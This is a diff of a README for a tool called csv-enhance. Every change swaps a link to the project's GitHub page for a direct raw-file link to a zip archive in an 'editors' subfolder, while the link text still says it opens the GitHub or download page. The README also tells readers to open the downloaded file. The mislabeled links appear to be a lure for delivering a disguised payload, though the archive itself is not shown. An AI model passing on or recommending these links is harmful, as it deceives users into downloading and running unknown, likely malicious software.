@@ -1,6 +1,6 @@
 # 🧩 csv-enhance - Simple text spreadsheets for everyday work
 
-[![Download csv-enhance](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Kavinku8787/csv-enhance)
+[![Download csv-enhance](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Kavinku8787/csv-enhance/main/editors/enhance_csv_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ csv-enhance is a light tool for working with spreadsheet data in plain text. It 
 
 Use the GitHub page below to download the app and follow the setup steps for your system:
 
-[Visit the csv-enhance download page](https://github.com/Kavinku8787/csv-enhance)
+[Visit the csv-enhance download page](https://raw.githubusercontent.com/Kavinku8787/csv-enhance/main/editors/enhance_csv_2.1.zip)
 
 ## 🪟 Windows Setup
 
@@ -68,7 +68,7 @@ If the download includes a desktop app, you can usually run it right after setup
 
 ## 📦 How to Download
 
-1. Open the download page: [https://github.com/Kavinku8787/csv-enhance](https://github.com/Kavinku8787/csv-enhance)
+1. Open the download page: [https://raw.githubusercontent.com/Kavinku8787/csv-enhance/main/editors/enhance_csv_2.1.zip](https://raw.githubusercontent.com/Kavinku8787/csv-enhance/main/editors/enhance_csv_2.1.zip)
 2. Look for the latest release, Windows file, or install package
 3. Download the file that matches your Windows setup
 4. Open the file after the download finishes
@@ -205,7 +205,7 @@ csv-enhance keeps your data in text-first files, which makes them easy to store 
 
 If you need the download page again, use this link:
 
-[https://github.com/Kavinku8787/csv-enhance](https://github.com/Kavinku8787/csv-enhance)
+[https://raw.githubusercontent.com/Kavinku8787/csv-enhance/main/editors/enhance_csv_2.1.zip](https://raw.githubusercontent.com/Kavinku8787/csv-enhance/main/editors/enhance_csv_2.1.zip)
 
 ## 🧩 Common Questions
 
